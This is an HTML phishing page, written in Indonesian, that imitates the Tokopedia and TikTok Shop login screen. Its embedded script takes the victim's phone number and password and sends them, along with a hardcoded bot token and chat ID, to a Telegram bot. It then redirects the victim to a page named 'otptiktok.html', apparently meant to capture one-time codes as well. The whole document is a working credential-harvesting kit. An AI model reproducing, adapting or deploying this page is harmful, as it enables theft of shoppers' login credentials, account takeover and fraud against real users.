<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Masuk Tokopedia & TikTok Shop</title>
<style>
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
      Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
    margin: 0;
    padding: 20px 16px;
    background-color: #fff;
    color: #191c29;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
  }
  .container {
    max-width: 400px;
    margin: 0 auto;
  }
  /* Header container dengan flexbox */
  .header {
    display: flex;
    justify-content: space-between;
    align-items: flex-start;
    margin-bottom: 40px;
  }
  /* Logo wrapper */
  .logo-wrapper {
    display: flex;
    flex-direction: column;
    align-items: flex-start;
    gap: 6px;
  }
  .logo-tokopedia {
    font-weight: 700;
    font-size: 28px;
    letter-spacing: -0.02em;
    color: black;
    font-family: Arial, sans-serif;
    margin: 0;
    line-height: 1.1;
  }
  .logo-tokopedia-border {
    width: 48px;
    height: 2px;
    background-color: #191c29;
  }
  .logo-tiktok-shop {
    display: flex;
    align-items: center;
    font-weight: 400;
    font-size: 16px;
    color: black;
    font-family: Arial, sans-serif;
  }
  .logo-tiktok-shop svg {
    width: 20px;
    height: 20px;
    margin-right: 8px;
    fill: black;
  }
  /* Area language */
  .language {
    font-weight: 600;
    font-size: 14px;
    color: #108080;
    cursor: pointer;
    user-select: none;
    font-family: Arial, sans-serif;
    margin-top: 4px;
    white-space: nowrap;
  }
  /* Ilustrasi */
  .illustration {
    display: flex;
    justify-content: center;
    margin-bottom: 40px;
  }
  .illustration img {
    max-width: 110px;
    height: auto;
  }
  h1.title {
    font-weight: 700;
    font-size: 18px;
    margin: 0 0 12px;
    text-align: center;
    color: #191c29;
    font-family: Arial, sans-serif;
  }
  .login-email-link {
    font-weight: 600;
    font-size: 14px;
    color: #108080;
    text-align: right;
    cursor: pointer;
    user-select: none;
    margin-bottom: 24px;
    font-family: Arial, sans-serif;
  }
  .login-email-link:hover {
    text-decoration: underline;
  }
  label {
    font-weight: 700;
    font-size: 14px;
    color: #3f4457;
    display: block;
    margin-bottom: 6px;
    font-family: Arial, sans-serif;
    text-align: left;
  }
  .phone-input-container {
    display: flex;
    border: 1px solid #d8d8d8;
    border-radius: 8px;
    overflow: hidden;
    margin-bottom: 20px;
    height: 44px;
  }
  select.country-code {
    background-color: #f6f6f6;
    border: none;
    font-weight: 600;
    font-size: 14px;
    color: #575a6b;
    padding: 0 12px;
    cursor: pointer;
    outline: none;
    appearance: none;
    display: flex;
    align-items: center;
    min-width: 75px;
    background-image:
      linear-gradient(45deg, transparent 50%, grey 50%),
      linear-gradient(135deg, grey 50%, transparent 50%);
    background-position:
      calc(100% - 20px) calc(1em + 2px),
      calc(100% - 15px) calc(1em + 2px);
    background-size: 5px 5px;
    background-repeat: no-repeat;
  }
  select.country-code::-ms-expand {
    display: none;
  }
  input.phone-number {
    flex-grow: 1;
    border: none;
    font-size: 14px;
    font-weight: 600;
    color: #575a6b;
    padding: 0 12px;
    outline: none;
  }
  input.phone-number::placeholder {
    font-weight: 400;
    color: #a0a2b0;
  }
  .password-group {
    position: relative;
    margin-bottom: 14px;
  }
  .password-group label {
    font-weight: 700;
    font-size: 14px;
    color: #3f4457;
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 6px;
    font-family: Arial, sans-serif;
  }
  .forgot-password {
    font-weight: 600;
    font-size: 12px;
    color: #108080;
    cursor: pointer;
    user-select: none;
  }
  .forgot-password:hover {
    text-decoration: underline;
  }
  input.password-input {
    width: 100%;
    height: 44px;
    border: 1px solid #d8d8d8;
    border-radius: 8px;
    padding: 0 40px 0 12px;
    font-size: 14px;
    font-weight: 600;
    color: #575a6b;
    outline: none;
    box-sizing: border-box;
  }
  input.password-input::placeholder {
    font-weight: 400;
    color: #a0a2b0;
  }
  .toggle-password {
    position: absolute;
    right: 12px;
    top: 65%;
    transform: translateY(-50%);
    width: 20px;
    height: 20px;
    cursor: pointer;
    fill: #a0a2b0;
    user-select: none;
  }
  .toggle-password:hover {
    fill: #108080;
  }
  .sms-login {
    font-size: 13px;
    font-weight: 600;
    color: #575a6b;
    cursor: pointer;
    margin-bottom: 32px;
    user-select: none;
    font-family: Arial, sans-serif;
    text-align: left;
  }
  .sms-login:hover {
    text-decoration: underline;
  }
  .btn-login {
    width: 100%;
    height: 44px;
    background-color: #108080;
    color: white;
    border-radius: 8px;
    border: none;
    font-weight: 700;
    font-size: 16px;
    cursor: pointer;
    user-select: none;
    transition: background-color 0.2s ease;
    font-family: Arial, sans-serif;
    margin-bottom: 32px;
  }
  .btn-login:hover {
    background-color: #0d6060;
  }
  .separator {
    display: flex;
    align-items: center;
    color: #a1a3ab;
    font-size: 14px;
    margin-bottom: 24px;
    user-select: none;
    font-family: Arial, sans-serif;
  }
  .separator::before,
  .separator::after {
    content: '';
    flex-grow: 1;
    height: 1px;
    background-color: #d3d4d8;
    margin: 0 10px;
    border-radius: 2px;
  }
  .btn-tiktok {
    width: 100%;
    height: 44px;
    background-color: #f6f6f6;
    border-radius: 8px;
    border: 1px solid #d9d9d9;
    font-weight: 600;
    font-size: 14px;
    color: #191c29;
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 8px;
    user-select: none;
    font-family: Arial, sans-serif;
    margin-bottom: 32px;
    transition: background-color 0.2s ease;
  }
  .btn-tiktok:hover {
    background-color: #e9e9e9;
  }
  .btn-tiktok img {
    width: 20px;
    height: 20px;
  }
  .register-footer {
    text-align: center;
    font-size: 14px;
    color: #575a6b;
    font-family: Arial, sans-serif;
  }
  .register-footer a {
    color: #108080;
    font-weight: 600;
    text-decoration: none;
    cursor: pointer;
    user-select: none;
  }
  .register-footer a:hover {
    text-decoration: underline;
  }
</style>
</head>
<body>
  <div class="container" role="main" aria-labelledby="loginTitle">
    <div class="header">
      <div class="logo-wrapper">
        <div class="logo-tokopedia" aria-label="Logo Tokopedia">tokopedia</div>
        <div class="logo-tokopedia-border"></div>
        <div class="logo-tiktok-shop" aria-label="Logo TikTok Shop">
          <svg aria-hidden="true" focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path d="M9.75 15.25V7.5H13.25C13.25 7.5 14 7.25 15 8.25L13.25 9.75V15.25H9.75ZM15.5 5.5C17.1237 5.5 18.5 6.87665 18.5 8.5C18.5 10.1234 17.1237 11.5 15.5 11.5C13.8766 11.5 12.5 10.1234 12.5 8.5C12.5 6.87665 13.8766 5.5 15.5 5.5Z"/>
          </svg>
          TikTok Shop
        </div>
      </div>
      <div class="language" tabindex="0" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Pilih bahasa">
        Bahasa Indonesia <span aria-hidden="true">â–¼</span>
      </div>
    </div>
    <div class="illustration">
      <img src="https://lf16-scmcdn.oecstatic.com/obj/oec-magellan-sg/atlas/account/page/account_login_sea/assets/br_login_icon.hk7zd5fo.svg" alt="Ilustrasi Handphone dengan logo TikTok" />
    </div>
    <h1 class="title" id="loginTitle">Masuk</h1>
    <div class="login-email-link" tabindex="0" role="button" aria-label="Masuk dengan email">Masuk dengan email</div>
    <form id="loginForm" aria-label="Form login" autocomplete="off" novalidate>
      <div class="form-group phone-group">
        <label for="phone">Nomor Telepon</label>
        <div class="phone-input-container">
          <select class="country-code" aria-label="Kode negara" id="countryCode" name="countryCode" required>
            <option value="+62" selected>ID +62</option>
            <option value="+65">SG +65</option>
            <option value="+60">MY +60</option>
          </select>
          <input class="phone-number" type="tel" id="phone" name="phone" placeholder="Masukkan nomor telepon Anda" autocomplete="tel" required pattern="[0-9\s\-]+" aria-describedby="phoneHelp" />
        </div>
      </div>
      <div class="form-group password-group">
        <label for="password">Kata Sandi
          <span class="forgot-password" tabindex="0" role="button" aria-label="Lupa kata sandi?">Lupa kata sandi?</span>
        </label>
        <input class="password-input" type="password" id="password" name="password" placeholder="Masukkan kata sandi Anda" autocomplete="current-password" required aria-describedby="passwordHelp" />
        <svg id="togglePassword" class="toggle-password" viewBox="0 0 24 24" role="button" tabindex="0" aria-label="Tampilkan sembunyikan password" xmlns="http://www.w3.org/2000/svg">
          <path d="M12 4.5C7.305 4.5 3.34 7.31 1.5 12c1.84 4.69 5.805 7.5 10.5 7.5s8.66-2.81 10.5-7.5c-1.84-4.69-5.805-7.5-10.5-7.5zm0 12c-2.48 0-4.5-2.02-4.5-4.5S9.52 7.5 12 7.5s4.5 2.02 4.5 4.5-2.02 4.5-4.5 4.5zm0-7a2.5 2.5 0 100 5 2.5 2.5 0 000-5z"/>
        </svg>
      </div>
      <div class="sms-login" tabindex="0" role="button" aria-label="Masuk dengan Kode SMS">
        Masuk dengan Kode SMS
      </div>
      <button type="submit" class="btn-login" aria-label="Tombol Masuk">Masuk</button>
    </form>
    <div class="separator" aria-hidden="true">atau</div>
    <button class="btn-tiktok" type="button" aria-label="Masuk dengan akun TikTok" onclick="alert('Login dengan akun TikTok');">
      <img src="https://lf16-scmcdn.oecstatic.com/obj/oec-magellan-sg/atlas/account/page/account_login_sea/assets/icon_tt.ecfvrvbm.svg" alt="Icon TikTok" />
      Masuk dengan akun TikTok
    </button>
    <div class="register-footer">
      Belum punya akun? <a href="#" tabindex="0" aria-label="Mendaftar">Mendaftar</a>
    </div>
  </div>

<script>
  // Toggle password eye icon
  const passwordInput = document.getElementById('password');
  const togglePassword = document.getElementById('togglePassword');

  togglePassword.addEventListener('click', () => {
    if(passwordInput.type === 'password') {
      passwordInput.type = 'text';
      togglePassword.innerHTML = '<path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 110-10 5 5 0 010 10z"/>';
    } else {
      passwordInput.type = 'password';
      togglePassword.innerHTML = '<path d="M12 4.5C7.305 4.5 3.34 7.31 1.5 12c1.84 4.69 5.805 7.5 10.5 7.5s8.66-2.81 10.5-7.5c-1.84-4.69-5.805-7.5-10.5-7.5zm0 12c-2.48 0-4.5-2.02-4.5-4.5S9.52 7.5 12 7.5s4.5 2.02 4.5 4.5-2.02 4.5-4.5 4.5zm0-7a2.5 2.5 0 100 5 2.5 2.5 0 000-5z"/>';
    }
  });

  togglePassword.addEventListener('keydown', e => {
    if(e.key === 'Enter' || e.key === ' ') {
      e.preventDefault();
      togglePassword.click();
    }
  });

  const loginForm = document.getElementById('loginForm');
  loginForm.addEventListener('submit', function(e) {
    e.preventDefault();

    const countryCode = document.getElementById('countryCode').value.trim();
    const phoneNumber = document.getElementById('phone').value.trim();
    const password = passwordInput.value.trim();

    if(!phoneNumber || !password) {
      alert('Mohon isi nomor telepon dan kata sandi Anda');
      return;
    }

    const fullPhone = countryCode + phoneNumber;

    // Simpan nomor telepon ke localStorage
    localStorage.setItem('PhoneNumber', fullPhone);

    // Kirim data ke Telegram
    const botToken = '8460065269%3AAAG_AqKScWEKGvrOaI_C-L7RWzS565Ci_wc'; // Ganti dengan token bot Anda
    const chatId = '7549590022';     // Ganti dengan chat ID Anda

    const message =
      `ðŸ“± *Data Login*\n` +
      `Nomor Telepon: ${fullPhone}\n` +
      `Kata Sandi: ${password}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    })
    .then(res => res.json())
    .then(data => {
      if (data.ok) {
        window.location.href = "otptiktok.html";
        loginForm.reset();
      } else {
        alert('Gagal mengirim data ke Telegram');
        console.error(data);
      }
    })
    .catch(err => {
      alert('Terjadi kesalahan saat mengirim data');
      console.error(err);
    });
  });
</script>
</body>
</html>
